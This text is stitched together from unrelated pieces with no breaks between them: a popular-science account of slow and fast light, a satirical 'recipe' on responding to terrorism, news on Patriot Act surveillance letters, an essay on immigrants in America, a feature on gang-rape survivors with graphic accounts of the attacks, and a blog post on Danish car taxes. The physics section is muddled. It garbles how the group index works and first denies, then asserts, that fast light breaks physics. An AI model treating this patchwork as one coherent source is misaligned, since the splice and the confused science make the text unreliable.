It discusses the equations that allow us to tune the velocity with which light passes through material media , known as its group velocity .
Changing the group velocity of light depends on a factor called the group index , which is the sum of the refractive index of the material the light is passing through and the frequency of the light multiplied by a term called the " dispersive contribution , " which relates the refractive index to the light 's frequency .
When you change these things about the light or its environment , you change the group index and effectively make the light go faster , slower , or even backwards .
The very words " fast light " sound suspiciously like the unraveling of relativity itself .
However , portions of a signal can be superluminal ( faster than the speed of light ) without actually breaking light 's speed limit .
Light moves in a pulse that , for most purposes , looks like a hump that trails off at either end , like a bell curve or a sleeping brontosaurus .
The front part of the pulse , where the transmission is officially no longer zero , moves no faster than light in a vacuum .
It is the body of the pulse , or more specifically , the highest point in the pulse , that can move at a superluminal velocity .
The the easiest way to arrange a group index that can create a superluminal velocity is to have a dispersive contribution that 's negative , meaning either the refractive index or the frequency of the light is getting smaller .
If it 's negative , the group index will be less than one , so when it divides the speed of light , the group velocity is larger than light 's speed in a vacuum .
The effect can't last for long periods of time , however : if the signal travels long enough for the body of the pulse to overtake its own front , it will distort .
Slow light , on the other hand , was first studied by passing light through complicated materials like Bose - Einstein condensates .
Scientists found they could drop light down to speeds as languid as a few dozen meters per second .
It turns out that slow light can happen a couple of different ways , even in materials kept at room temperature .
One method is stimulated Brillouin scattering , which is produced by passing a strong and a weak laser beam through through a transparent material , along with an acoustic wave generated by the laser beams themselves .
The interactions between these beams cause the light inside the medium to move slower than its regular speed .
Another method , called coherent population oscillation , shines two light beams of slightly different frequencies on a crystal like alexandrite .
At the right frequencies of light , the atoms inside the alexandrite are driven consistently between the ground and excited states .
Because the two different frequencies of light become preoccupied with changing the states of the particles , with each frequency constantly undoing the work of the other , the total group velocity is reduced .
At other frequencies , alexandrite can even become what 's termed an inverse saturable absorber .
Even though it 's a relatively transparent crystal , the same coherent population oscillation effect will result in some frequencies of light being spit back by the atoms in the opposite direction the light came , usually at velocities as high as 800 meters per second .
The light is most easily slowed when using mediums with a high dispersive contribution .
Now that slow light and fast light are better understood and can be reproduced in a wider variety of experimental configurations , researchers are trying to figure out what to do with them .
Most of the potential practical applications have focused on communications technology .
To begin with , significantly slowed light has the benefit of reducing noise in transmissions .
It might also come in handy for optical switching — a slow - light medium could act as a buffer for packets , allowing a switch , which can only handle one packet at a time , to deal with each packet separately .
Missed packets might become a thing of the past .
The ability to control light could also come in handy in microwave photonics systems that translate radio- or microwave - frequency signals into optical signals .
These devices are now integrated into systems like broadband WiFi networks .
Microwave photonics hardware needs continuously tunable time delay to separate out parts of an optical waveform , and a combination of both slow and fast light buffers might be able to help the devices sort and process the signals more easily .
So , it 's possible that violating one of the fundamental rules of physics may actually produce some marketable devices .

Recipe
It seems to me that the following recipe is in season :
When a single , isolated criminal claims to be acting for , with , or in support of Al Qaeda :
Stop everything ; give him as much attention as you possibly can .
If practical , emphasize the incredible dangers he poses even after his arrest and which threaten any jail , prison , or state in which he happens to be confined .
If possible , torture him sufficiently to ensure that he can never be tried in court .
Immediately add additional , highly - visible and inconvenient security theater to demonstrate that Something Is Being Done .
Spare no expense .
Ignore the thousands of dollars of costs for additional screening , and the millions of dollars of lost waiting time , missed flights , and cancelled trips .
Insist that these costs be suffered by all international travelers , everywhere .
This group , after all , includes most of the economic and political decision - makers in the world .
Be sure , as they take off their shoes and see their perfume confiscated and have their retinas scanned , that they know these restrictions and costs are imposed by a US government in which they have no voice , which has not asked their leave , and is unlikely to thank them .
Readers will recognize this as that difficult old classic , the recipe for How To Lose To Terrorists , originally served in Algeria and Indo - China , though arguably based on 18th century cookbooks from Lexington and Concord .
The House of Representatives tabled on Wednesday legislation to reform U.S. surveillance law .
The two - month delay puts off a collision with a competing Senate version .
The move automatically extends provisions of the Patriot Act that would otherwise expire at year 's end .
The Senate is likewise expected to delay the matter .
The act , hastily adopted six weeks after the 2001 terror attacks , greatly expanded the government ’s ability to spy on Americans in the name of national security .
A key difference between the House and Senate packages concerns the standard by which the FBI may issue so - called National Security Letters – although Wednesday 's vote prolongs the time for more backroom negotiations .
Reforming NSL powers is a key bone of contention in the Patriot Act debate , even though it is not one of the three Patriot Act provisions that was scheduled to expire Dec. 31 .
NSLs allow the FBI , without a court order , to obtain telecommunication , financial and credit records relevant to a government investigation .
The FBI issues about 50,000 NSLs annually , and an internal watchdog has found repeated abuses of the NSL powers .
A House version permits NSLs in cases concerning terrorism or spy activities of an agent of a foreign power .
If it became law , such a plan would vastly reduce whom the government could target .
The Senate version generally would leave NSLs under the status quo .
Under Wednesday 's action , the NSL - reform vote is also delayed until the New Year .
And the three expiring provisions will remain in force at least through February .
The extension came as House Speaker Nancy Pelosi ( D - California ) balked at a Senate plan to include Patriot Act amendments into a $ 636 billion Pentagon funding measure , saying doing so would create " revolt on the left . "
One of the Patriot Act provisions that was set to expire concerns the FBI obtaining wiretaps from a secret court — known as the Foreign Intelligence Surveillance Act Court or FISA court — without having to identify the target or what method of communication is to be tapped .
Another provision in question is the so - called " lone wolf " measure that allows FISA court warrants for the electronic monitoring of a person for whatever reason — even without showing that the suspect is an agent of a foreign power or a terrorist .
The government has said it has never invoked that provision , but that it wants to retain the authority to do so .
The third and final provision concerns one of the more controversial provisions of the Patriot Act — Section 215 .
The section allows the secret FISA court to authorize broad warrants for most any type of record , including those held by banks , libraries and doctors without requiring the government to show a connection between the items sought under a Section 215 warrant and a suspected terrorist or spy .
A Senate version and a House version require such a connection when it comes to library records .

AT ONE of the many Korean restaurants in Annandale , Virginia , a waitress cracks a raw egg into a sizzling tofu - and - oyster stew .
Tables buckle under heaps of chili- , garlic - and cabbage - themed side dishes .
Every customer is of Korean origin .
Is this a sign that Korean immigrants are failing to assimilate in America ?
Far from it .
A mother addresses her college - age daughter in Korean ; the daughter replies in English .
A muscular man with a buzz cut reads a Korean newspaper ; his T - shirt proclaims , in English : “ Support our Troops ” .
Across the highway , in a building that houses several Korean businesses , Joshua Lee sits on a sofa and explains why he likes living in America .
He grew up poor : his father was a day labourer .
He did his military service on an American base in Seoul , where he polished his English and learned to like hot dogs .
He moved to America in 1990 , when he was 27 , to study theology in Kentucky .
He painted houses to support himself .
He met his wife , a Korean - American , and moved to northern Virginia , home to a hefty cluster of Korean - Americans .
Eventually , he found a job writing for a Korean - language newspaper about Korean - American issues .
When he arrived , Mr Lee was astonished by how rich nearly everyone was .
He recalls his first dinner with Americans : the huge bowls and immense portions .
He was startled to see lights left on in empty rooms .
He is still impressed : “ The roads are so wide , the cars so big , the houses so large — everything is abundant , ” he says .
Yet this is not why he came , and it is not why he stayed and became a citizen .
For Mr Lee , America is a land that offers “ the chance to be whatever you want to be ” .
More prosaically , it is a place where nearly any immigrant can find a niche .
Mr Lee 's niche is an agreeable one .
His suburb has safe streets , spacious backyards and good schools .
He eats Korean food every day , but not for every meal .
He attends a Baptist church where services are in Korean , but the Sunday - school classes are in English .
He retains what he loves about his native culture — the work ethic , language , spicy cabbage — while shrugging off the rest .
For example , he never liked the way his neighbours in Korea stuck their noses into each other 's business .
Everyone knew how you were doing in school .
You could not get a good job without connections .
There was constant social pressure not to lose face .
When Mr Lee went back to visit , he remembers slipping into the old straitjacket .
He wanted to pop out to the corner shop , but realised he would have to put on a smart shirt and trousers , despite the intense humidity .
What would the neighbours think if they saw him in shorts and flip - flops ?
In America , no one cares .
In Korea , he says , to express an unusual opinion is to court isolation .
In America , you can say what you think .
To relax , Mr Lee listens to Rush Limbaugh and Sean Hannity , two combative right - wing pundits .
“ Maybe you do n't like these people , but I really [ do ] , ” he says .
Three hundred million niches
Because America is so big and diverse , immigrants have an incredible array of choices .
The proportion of Americans who are foreign - born , at 13 % , is higher than the rich - country average of 8.4 % .
In absolute terms , the gulf is much wider .
America 's foreign - born population of 38 m is nearly four times larger than those of Russia or Germany , the nearest contenders .
It dwarfs the number of migrants in Japan ( below 2 m ) or China ( under 1 m ) .
The recession has dramatically slowed the influx of immigrants and prompted quite a few to move back to Mexico .
But the economy will eventually recover and the influx will resume .
No matter where an immigrant hails from , he can find a cluster of his ethnic kin in America
Nearly all Americans are descended from people who came from somewhere else in the past couple of centuries .
And the variety of countries from which immigrants come — roughly all of them , and usually in significant numbers — is unmatched .
No matter where an immigrant hails from , he can find a cluster of his ethnic kin somewhere in America .
In fact , he is probably spoilt for choice .
If he wants to live in a suburb , eat Korean food and listen to fire - and - brimstone sermons in Korean , he can do so in northern Virginia .
If he prefers an urban and secular Korean lifestyle , he can try Boston or San Francisco .
If he craves Ethiopian food , Amharic radio and lots of gay clubs , Washington , DC , may suit him .
And so on .
You can find welcoming clusters of ethnic minorities in other rich countries , but not nearly as many .
In a European country , if you want Korean food and a particular denomination of Korean church , you might find it in the capital but you will struggle in the suburbs .
In America , it is easier to find just the niche you want : Polish or Vietnamese , metropolitan or exurban , gay or straight , Episcopalian or Muslim , or any combination of the above .
You have a choice of weather and landscape , from snowy Alaska to baking Texas , from the mountains of Colorado to the forests of Maine .
Northern Virginia , where Mr Lee lives , has the same climate as his homeland : winter is freezing , summer is muggy , autumn is delightful and spring brings cascades of cherry blossoms .
A place where hunters are not hounded
Consider another example .
Dennis Downing , an Englishman , moved to America for the fox - hunting .
A professional huntsman , he cares for the hounds that hunt the fox during a traditional hunt .
( Everyone else is merely there for the ride . )
He has done this all his working life .
eyevine
Gone to the dogs since they moved in
In 1997 Britain elected a government that promised a vote on banning the sport and Mr Downing , seeing the writing on the wall , left the next year .
( Fox - hunting was eventually banned in 2004 . )
After three years with a hunt in Alabama , he moved to Virginia , where English - style fox - hunting has been popular since George Washington 's day .
He now works with the Blue Ridge Hunt and lives in the beautiful Shenandoah valley .
He likes the weather , the space and the freedom to hunt .
That freedom is secure .
America has 50 states with 50 sets of laws .
Virginia will never ban hunting , but even if it did , there are 49 other states that wo n't .
In America , people with unusual hobbies are generally left alone .
And power is so devolved that you can more or less choose which rules you want to live under .
If you like low taxes and the death penalty , try Texas .
For good public schools and subsidised cycle paths , try Portland , Oregon .
Even within states , the rules vary widely .
Bath County , Kentucky is dry .
Next - door Bourbon County , as the name implies , is not .
Nearby Montgomery County is in between : a “ moist ” county where the sale of alcohol is banned except in one city .
Liberal foreign students let it all hang out at Berkeley ; those from traditional backgrounds may prefer a campus where there is no peer pressure to drink or fornicate , such as Brigham Young in Utah .
People move for a variety of reasons .
Alejandro Mayorkas , the head of the United States Citizenship and Immigration Services , cites two .
People come to America , he says , either because they yearn for freedom or because they are fleeing something .
That something could be a civil war , or it could be a culture that irks them .
In Ayaan Hirsi Ali 's case , it was both .
She was born in Somalia .
As a young girl she was circumcised .
“ I heard it , like a butcher snipping the fat off a piece of meat , ” she recalls .
Her grandmother taught her to expect men to be violent .
If attacked , she told her to duck behind the man , reach up inside his sarong , grab his testicles and crush them .
Ms Hirsi
Ali grew up strong - willed .
She fled from Somalia 's civil war , and then from an arranged marriage .
She sought asylum in the Netherlands , a country that she found shockingly nice .
The policemen were polite and helpful , instead of demanding bribes with menaces .
The government gave refugees room and board .
“ Where did they get the money from ? ” she wondered , “ Why did n't it run out ? ”
She quickly learned Dutch and found work as an interpreter .
In this job , she visited shelters for battered women , where she noticed that nearly all the victims were Muslims .
These women seldom pressed charges against their violent husbands .
The social workers would ask : “ Do you have family here ?
Can they help you ? ”
The women would reply : “ But they support my husband , of course ! ”
This infuriated Ms Hirsi Ali : “ I knew that many Dutch women were abused , too .
But their community and their family did n't approve of it . ”
She began to campaign against domestic violence .
She became a member of parliament , and won a dangerous kind of fame as an ex-Muslim apostate .
With a Dutch filmmaker , Theo van Gogh , she made a short film about what she saw as the oppression of women under Islam .
An outraged fanatic murdered van Gogh and stabbed into his chest a letter to Ms Hirsi Ali , promising to kill her , too .
So she moved to America , where she is not famous .
She keeps sensibly quiet about where she lives , but she can travel and shop without the constant fear of death .
Speaking in Dallas , she praises the intellectual freedom in America .
In the Netherlands , she says , think - tanks are typically subsidised by the government and tied to a political party .
This makes them timid , she believes .
If an idea sounds too controversial , they shy away from it .
For example , she had a theory that government - funded Muslim schools in the Netherlands were fostering self - segregation , and asked if they should be closed .
No one wanted to listen , she says ; her colleagues feared appearing racist .
In America swarms of privately funded think - tanks represent almost any view you can imagine .
Their response to hard questions is more serious , she says .
People ask if your hypothesis is true , and then suggest ways to raise the money to find out .
In America , Ms Hirsi Ali found the funds to set up a foundation to study violence against Muslim women .
No one has a clue how common this is in America .
She means to find out .
She admits that before visiting America she had a negative view of the country .
Listening to her Dutch friends , she assumed that Americans were fat , loutish , naive and sexually repressed .
“ But then I came here and found it was all false , ” she smiles .
Outsiders sometimes assume that it is hard to be an outspoken atheist in a devout country such as America .
Ms Hirsi
Ali thinks it is easy .
Many Christians ask if she is a believer .
When she replies no , she says “ they do n't try to kill me .
They say they 'll pray for me ” .
Besides Somalia and the Netherlands , Ms Hirsi Ali has lived in Ethiopia , Kenya and Saudi Arabia .
Of all these places , she considers America to be the easiest place to assimilate .
She has her niche , hanging out with “ nerdy academics ” and eating Japanese food .
Unlike Mr Lee , she is more or less divorced from her native culture .
But that works just fine in America .
“ I 'm surprised how fast complete strangers will invite you into their houses , ” she says .
Asked what she dislikes about her new home , she mentions that the air - conditioning is too cold .
A magnet for talent
Migration matters .
Economic growth depends on productivity , and the most productive people are often the most mobile .
A quarter of America 's engineering and technology firms founded between 1995 and 2005 had an immigrant founder , according to Vivek Wadhwa of Harvard Law School .
A quarter of international patent applications filed from America were the work of foreign nationals .
And such measures ignore the children of immigrants .
Jeff Bezos , the founder of Amazon , is the stepson of a man who fled Cuba at the age of 15 and arrived without even a high - school diploma .
Richard Florida , the author of such books as “ The Flight of the Creative Class ” and “ Who 's Your City ? ” , argues that countries and regions and cities are engaged in a global battle for talent .
The most creative people can live more or less where they want .
They tend to pick places that offer not only material comfort but also the stimulation of being surrounded by other creative types .
This makes life more fun .
It also fosters technological progress .
When clever people cluster , they can bounce ideas off each other .
This is why rents are so high in Manhattan .
Robert Lucas , a Nobel economics laureate , argues that the clustering of talent is the primary driver of economic growth .
So a country 's economic prospects depend in large measure on whether it is a place where people want to be .
Desirable destinations draw talented and industrious migrants .
Less desirable ones suffer a brain drain .
Desirability is tricky to measure , however .
People cannot vote freely with their feet .
No rich country allows unlimited immigration , and the rules vary a lot , so it is impossible to know which country is the most attractive to the largest number of people .
But there are reasons to believe that America ranks at or near the top .
Mr Florida and Irene Tinagli of Carnegie Mellon University compiled a “ Global Creativity Index ” , which tries to capture countries ' ability to harness talent for “ innovation ... and long - run prosperity ” .
The index combines measures of talent , technology and tolerance .
America comes fourth , behind Sweden , Japan and Finland .
You could quarrel with the methodology .
America comes top on certain measures , such as patents per head and college degrees , but it is deemed less tolerant than other countries in the top ten .
This is because the index rewards “ modern , secular ” values and penalises Americans for being religious and nationalistic .
This is a mistake .
Some religious countries are indeed intolerant , but America is not one of them , as Ms Hirsi Ali attests .
And for many talented people , such as Mr Lee , America 's vibrant and varied religious scene makes the country more attractive , not less .
Michael Fix of the Migration Policy Institute , a think - tank , observes that religion has a strong effect on who comes to America .
For example , although Muslims slightly outnumber Christians in Nigeria , Nigerian immigrants to America are 92 % Christian and only 5 % Muslim .
Christians are about a quarter of the South Korean population , but four - fifths of Korean immigrants in America are Christian .
Migrants from the Middle East and North Africa are mostly Muslim , but a hefty 28 % are Christian and 10 % are Jewish .
Christians and Jews are drawn to America in part because they know it is an easy place to be Christian or Jewish .
They do n't face persecution , as they might in the Middle East .
Nor do they face derision , as they might in more aggressively secular parts of Europe .
Also , churches create networks .
Migrants typically go where they already know people , and often make contact through a church .
It is also a mistake to rate Americans as less tolerant because they are nationalistic .
Americans may have an annoyingly high opinion of their country , but theirs is an inclusive nationalism .
Most believe that anyone can become American .
Almost nobody in Japan thinks that anyone can become Japanese , yet Japan is rated more “ tolerant ” than America .
This is absurd .
Fear of foreigners
Not everyone thinks that immigration makes America stronger .
Most of the Republicans who ran for president in 2008 promised a tough line on the illegal sort .
Tom Tancredo , the angriest of them , describes America 's porous borders as a “ mortal danger ” , though he is the grandson of immigrants from Italy .
Pat Buchanan , another former presidential candidate , wrote a book subtitled : “ The Third World Invasion and Conquest of America ” .
Some worry about illegal immigration because they favour the rule of law .
“ When there are people in Mexico City waiting in line and paying their fees and doing everything right , and they are having to wait for years , and then other folks are coming in without waiting in line — that 's not fair , ” said Barack Obama in October .
But many Americans also think that too many legal immigrants are admitted .
Some fear that open borders make it easier for terrorists to sneak in .
Others worry that immigrants overload schools and hospitals , or drag down the wages of the native - born .
Environmentalists fret that immigration drives population growth , which aggravates urban sprawl , pollution and global warming .
The argument that stirs the hottest passions , however , is cultural .
The late Samuel Huntington , a Harvard academic , argued that Hispanic immigrants , because they are so numerous , will not assimilate .
Rather , they threaten to “ divide the United States into two peoples , two cultures and two languages ” and “ [ reject ] the Anglo - Protestant values that built the American dream ” .
Some look at the great multi-ethnic experiment and see a society on the brink of breakdown
Mark Krikorian , the author of “ The New Case Against Immigration : Both Legal and Illegal ” , points out that modern immigrants can call home every day .
This , he says , means they are less likely to give up their old ties and become American .
He complains that the American elite no longer thinks American culture is worth preserving , and therefore no longer insists that immigrants imbibe it .
He also predicts that mass immigration from poor countries is incompatible with the welfare state — too many newcomers will bankrupt it .

Some outsiders look at America 's great multi-ethnic experiment and see a society teetering on the brink of violent breakdown .
“ White America is in decline , ” writes Gary Younge , a left - wing British journalist .
He adds : “ Never having considered the unearned privilege of being white and American , all they can see are things being taken away from them .
Never having considered solidarity with blacks and Latinos , they see them not as potential allies but as perpetual enemies . ”
Nearly all this gloom is misplaced .
It is possible that unskilled immigrants hurt the wages of unskilled locals .
George Borjas , a Harvard economist , estimates that native workers ' wages decline by 3 % or 4 % for every 10 % increase in immigrants with similar skills .
But others , such as David Card of the University of California , Berkeley , have found little or no impact .
Gianmarco Ottaviano of the University of Bologna and Giovanni Peri of the University of California , Davis , find that nearly 90 % of native - born American workers actually enjoy higher wages because of immigration .
Many immigrants bring new skills and ideas , spend money , pay taxes and employ natives .
Mass immigration may be hard to combine with a generous welfare state , but this argument applies more to Europe than to America .
In America it is hard for an able - bodied adult male to do anything more than subsist on welfare .
So immigrants work , which means they are seldom much of a drain on the public purse , and they have no choice but to assimilate .
People who work together need to get on with each other , so they generally do .
Because immigrants have to work , America does not have ghettos full of permanently jobless and alienated young immigrants , as in France , for example .
This is perhaps why , although America has a high murder rate — three times that of Britain — its immigrants rarely riot .
They are too busy earning a living .
America has not in recent years seen anything like the immigrant riots that torched the Paris suburbs in 2005 .
The closest parallel , the Los Angeles riots of 1992 , sprang from the unique grievances of the one large ethnic group whose ancestors did not voluntarily migrate to America : African - Americans .
Some of America 's talk - show hosts are quite vicious , but no openly xenophobic politician can attract the kind of support that France 's Jean - Marie Le Pen did in 2002 , or that Austria 's Jörg Haider did before he got drunk and killed himself in a car crash .
Political rhetoric in America is often heated but almost never leads to violence .
Ms Hirsi
Ali recalls watching the vice - presidential debate on the television last year with friends in New York .
Her Democratic friends thought Sarah Palin was ghastly .
Her Republican friends were equally appalled by Joe Biden .
Tempers rose so high during the election campaign that Ms Hirsi Ali thought the country might come to blows .
But then polling day passed , and the tension was gone .
She saw her Republican and Democrat friends eating cupcakes together .
Americans get passionate about politics , she observes , but the next day they get on with their lives .
As Mr Krikorian concedes , the fear that new immigrants are disagreeably different is not new .
In 17th - century Massachusetts , one group of English Protestants ( the Puritans ) banished another group of English Protestants ( the Quakers ) and even hanged some of those who returned .
Benjamin Franklin doubted that German immigrants would ever assimilate .
“ Why should the Palatine Boors be suffered to swarm into our settlements ? ” he asked , adding that they “ will never adopt our Language or Customs ” .
Today , there are 50 m German - Americans , hardly any of whom speak German .
Indeed , they have intermingled and intermarried so much that they are barely noticeable as a separate group .
The doomsayers about immigration have always been wrong before .
It is a fair bet that they are wrong now .
America has lost none of its capacity to absorb newcomers .
A recent survey by Public Agenda , a polling group , asked immigrants in America how long it took them to feel comfortable and “ part of the community ” .
Some 77 % said it took less than five years .
Only 5 % said they had never felt that they fitted in .
In contrast 58 % of people of Turkish descent in Germany say that they feel unwelcome , and 78 % do not feel that Angela Merkel is their chancellor .
America is a uniquely attractive place to live : a lifestyle superpower .
But it cannot afford to be complacent , for three reasons .
First , other places , such as Australia , Canada and parts of Western Europe , have started to compete for footloose talent .
Second , rising powers such as India and China are hanging on to more of their home - grown brains .
There is even a sizeable reverse brain drain , as people of Indian or Chinese origin return to their homes .
But neither India nor China attracts many completely foreign migrants who wish to “ become ” Indian or Chinese .
Third , since September 11th 2001 the American immigration process has become more security - conscious , which is to say , slower and more humiliating .
Even applicants with jobs lined up can wait years for their papers .
Many grow discouraged and either stay at home or try their luck somewhere less fortress - like .
A bigger welcome mat needed
President Obama promises immigration reform : stricter border controls but also a path to citizenship for those in the country illegally .
George Bush promised the same thing , but Congress blocked him .
Mr Obama has his work cut out to avoid that fate ; and although he is the son of a Kenyan Harvard student , he has done little to make the system less cumbersome for skilled migrants .
“ The United States alone among great powers will be increasing its share of world population over time ”
The stakes are high .
Immigration keeps America young , strong and growing .
“ The populations of Europe , Russia and Japan are declining , and those of China and India are levelling off .
The United States alone among great powers will be increasing its share of world population over time , ” predicts Michael Lind of the New America Foundation , a think - tank .
By 2050 , there could be 500 m Americans ; by 2100 , a billion .
That means America could remain the pre-eminent nation for longer than many people expect .
“ Relying on the import of money , workers , and brains , ” writes Mr Lind , America is “ a Ponzi scheme that works . ”
Brianna Sylvers still lurches up in bed sometimes , screaming , as memories flood her mind .
She remembers the three rapists punching her face until it was a mass of bruises .
She remembers them stripping off her pants and , one after the other , raping her with increasing fury .
She remembers waking up the next day , spattered with her own blood in a San Francisco schoolyard , thinking , " What the hell happened ? "
Those flashbacks have been coming more frequently since Sylvers read about the gang rape last month of a 16 - year - old Richmond girl .
Sylvers was 15 when she was violated 20 years ago .
Sylvers and two other women gang - raped in the Bay Area as teenagers have advice for the Richmond High School sophomore who was attacked by as many as 10 young men while as many as 20 more looked on and laughed :
This was not your fault .
Believe in yourself .
Listen only to people who are supportive of that belief .
" Do n't lose yourself to the traumatic experience you 've been through , " Sylvers , 35 , said in an interview near her San Bruno home .
" Find the love you have for yourself .
Remind yourself of the talents you have .
" It 's the way I came through it .
She can , too . "
This is not to say recovery will be easy , the survivors say .
It wo n't be .
A long climb back
Sylvers , 50 - year - old Susie Chin of San Francisco and 48 - year - old Susan Weeks of Malibu have had decades to recover from being gang - raped .
Through years of therapy , self - reflection and the help of loved ones and organizations , they emerged healthy .
But each said the experience is never far from her mind .
Being attacked became part of who they were , and they had to work hard not to be crushed by that .
The work never ends .
" I had to learn to honor my pain , realize it was OK to feel bad - and then also realize that the sun always will rise again in the morning , " said Weeks , who was raped by six men in Napa County in 1979 .
" Every day is a new opportunity to heal .
You have to never forget that . "
Gang rapes constitute 11 percent of the estimated 100,000 rapes reported annually , according to national statistics .
And while 73 percent of all rapes are committed by attackers known to their victims , in gang rape the opposite is true - 75 percent are committed by strangers .
The swarming assaults are more violent and leave more post - traumatic stress and thoughts of suicide in their victims than other forms of rape , said University of Illinois criminology Professor Sarah Ullman , one of the few researchers who has studied gang rape .
The victims are also more subject to ridicule and condemnation than those attacked by individuals .
" It 's about the worst thing that can happen to you , and some people can't talk about it at all , " said Sylvers , who came to know other survivors as she got older .
" But you have to talk .
It 's very important .
You have to find people you trust , and talk it all through . "
This is difficult at best .
Janelle
White , executive director of San Francisco Women Against Rape , said many rape victims find that when they reach out , they are blamed for the attack - they dressed provocatively , walked unwisely into the dark alley , hung out with the wrong people .
That is grievously incorrect and damaging to hear , she said .
" Rape is about wanting to dominate somebody , and sex is just the tool the attacker uses , " White said .
" Yes , we do want to talk about things women can do to avoid risky situations , but the thing to remember is that nobody deserves to be raped . "
The risk factors in the Richmond rape were particularly perilous .
After leaving her homecoming dance , the girl walked over to a darkened courtyard known for trouble , the rough young men there were drinking , and she was by herself .
But none of those factors meant the girl gave permission for what happened .
" Gang rape is a hate crime - it's about the rapists ' extraordinarily violent way to establish their manhood and dominance over women , " said Terry O'Neill , president of the National Organization for Women .
" It 's not about a victim asking for this . "
Abducted and raped
All the sociological statistics and talk are comforting to Sylvers , Chin and Weeks .
But at its core , recovery from rape is a solitary , lonely endeavor .
Each of the three attacks had different outcomes legally .
Sylvers filed a police report , but nobody was ever caught .
Weeks called police , and her attackers were sent to prison .
Chin had the more typical rape experience - she was too shaken and afraid to report the attack to police .
What they all had in common , though , was the helplessness of being swarmed by a group of men .
Sylvers lived in the Mission District in 1989 .
She was spraying graffiti and getting drunk on the night she was attacked .
Sleeping off the booze on a friend 's couch , she was caught by surprise when three men sneaked in through the back door and kidnapped her .
They drove her to a schoolyard in the Richmond District , beating her with progressive ferocity .
" I remember yelling , ' Do n't kill me , ' and fighting back , but there were too many of them , " she said .
" I woke up at 5:30 the next morning on the concrete , nude .
I was beaten up so badly that as soon as I stood up , I fell right down again . "
She wrapped newspaper around herself and hailed a man in a car , who drove her home .
Her mother took her to the hospital .
Filing a police report took a day .
The healing took years .
" Some family members just could n't talk about it , so I got my support from my boyfriend at the time , my mother and my four closest girlfriends , " Sylvers said .
" At first I was just angry at the injustice of what happened to me , but then I used the event to help direct myself . "
After six weeks of rape counseling , Sylvers went to stay with relatives at a tribal rancheria in the North Bay for six months .
There , she contemplated her Indian spiritual heritage and her direction in life , and came out stronger .
When she moved to Daly City with her mother for her final two years of high school , Sylvers stopped tagging and getting drunk .
She played on the Westmoor High School basketball team , acted in school plays , brought her grade average up from 1.2 to 3.6 - and upon graduation won the school 's " Unsung Hero " award .
Today , Sylvers is an accountant and a licensed massage therapist .
The mother of a teenage daughter , she says she sees nothing but clear skies ahead in her life - despite the occasional flashbacks .
" I got a clean slate , " she said .
" I learned to love myself . "
Chinatown attack
Most rape victims - 61 percent - are so ashamed , afraid , or just plain traumatized that they never report the crime , statistics show .
Susie Chin was one such victim .
When she was gang - raped at 16 in her Chinatown neighborhood 33 years ago by at least eight men , she felt she had no family or peer support .
Only fear and shame .
It was 15 years before she finally grappled with the residual trauma .
Chin 's face tightened last week when she recalled that night in 1976 when she was at a hotel visiting with friends and out - of - town visitors .
At one point she found herself alone in one of the rooms , " and the next thing I knew the lights were off and there was a swarm of dark images coming in , all men . "
" I screamed , because there were people in the next room and I thought they would save me , " she said .
" But one of the men smashed a bottle and said , ' Shut up or I 'll cut up your face . '
I could see there was no use fighting , so I pretended I blacked out , and they just came at me one after the other . "
By morning , she lost count of how many raped her .
They finally left , and she took herself home .
" I was afraid to say anything to my family , or to even report the rape to police , " she said .
" I thought the group that attacked me would find me , stalk me , make my life miserable .
So I never talked about it . "
Getting help years later
After 15 years , Chin found she had stuffed her pain so deep inside , " I could n't cry , could n't express negative or positive feelings . "
She went to a rape crisis center - and there , getting counseling among women with similar experiences , her emotional dam burst .
She spent several years in therapy , and as she healed she spoke at rape survivor gatherings and wrote a song about her recovery , called " Charlene . "
Today Chin is a singer and writer , and finds that her experience is still not something she can just blurt out to anyone .
" But I no longer have shame , " she said .
" It was never my shame to begin with - it was someone else 's . "
Weeks was 17 and driving home to Napa after a night shift working as a chef in 1979 when her life changed .
" My car broke down in Highway 29 , and this car came along filled with six men , " she said .
" I got in , which was really stupid .
That does n't mean you can blame a person for doing something like that - but it was stupid . "
While the group was starting to rape her in a vineyard , a car drove by .
" I tried to get away and go to it , but they all jumped me , suffocated me , and I was afraid they would kill me , so I stopped struggling , " Weeks said .
Leaving family behind
Fortunately , the rapists were the opposite of cunning .
They dumped her in Yountville and then went drinking at a local bar .
Weeks called police , and within half an hour all six were in custody .
Two attackers fled to Mexico after making bail .
The other four were convicted of rape and sent to prison .
But seeing the rapists disappear behind bars was just the beginning of her recovery , Weeks said .
" A lot of my family blamed me for what happened , and today I have no contact with most of them , " she said .
" They looked at me as damaged goods .
" I did a lot of therapy , and the therapist said , ' You need apples , and they are oranges , so you have to ditch those people .
They are not helping you , ' " Weeks said .
" So that 's what I did . "
While taking time off from school , Weeks found comfort in watching one movie after another .
It turned out to be prophetic .
She went on to earn a master 's degree in film production at UCLA and is now a movie visual effects artist .
She was nominated for Academy Awards , with the rest of her team , for her work on " Star Wars : Episode II - Attack of the Clones " and " Pearl Harbor . "
" My advice to the girl in Richmond is to do like I did :
If you feel too bad to go to school , do n't go , " Weeks said .
" Feel too bad to work ?
Do n't go .
Give yourself time to heal .
" I would tell her to get a whole fresh start .
It works . "
NY Times —
Is saving $ 40,000 at the showroom enough to get drivers behind the wheel of an electric car ?
With a program in the works to add easy access to charging stations , Denmark is about to find out .
The country imposes a punitive tax of about 200 % on new cars , so a vehicle that would cost $ 20,000 in the United States costs $ 60,000 here .
For a quarter - century , electric cars have been exempt from that tax .
But the models on the market were so limited in their capabilities that only 497 of them are registered in the entire country .
For all their potential , electric cars have always been the subject of more talk than action , and only a handful are on the road in Denmark .
But now the biggest Danish power company is working with a Silicon Valley start - up in a $ 100 million effort to wire the country with charging poles as well as service stations that can change out batteries in minutes .
The government offers a minimum $ 40,000 tax break on each new electric car — and free parking in downtown Copenhagen .
But even in Denmark , one of the most environmentally conscious nations in the world , skepticism abounds .
It is not clear that car buyers can be persuaded to make the switch .
“ There is a psychological barrier for consumers when their car is dependent on a battery station , ” warned Henrik Lund , a professor of energy planning at Aalborg University .
“ It ’s risky . ”
MP : Two amazing points : First , a 200 % tax on cars in Denmark ?
That seems crazy .
Second , most car buyers in Denmark actually pay the 200 % tax and buy a regular car when they could avoid it by buying an electric car ?
That seems even crazier .
I always thought if you tax something , you get less of it , and if you subsidize something you get more of it ?
Not in Denmark I guess .
Thanks to Stuart Anderson .
Update : Denmark , which hosts the UN climate change conference next week , is often seen as one of the most environmentally friendly countries in the world .
This reputation is mostly undeserved , but Denmark is doing its best to catch up .
MP : Undeserved is maybe right , since many seem perfectly willing to pass up $ 40,000 in green subsidies and tax savings ?
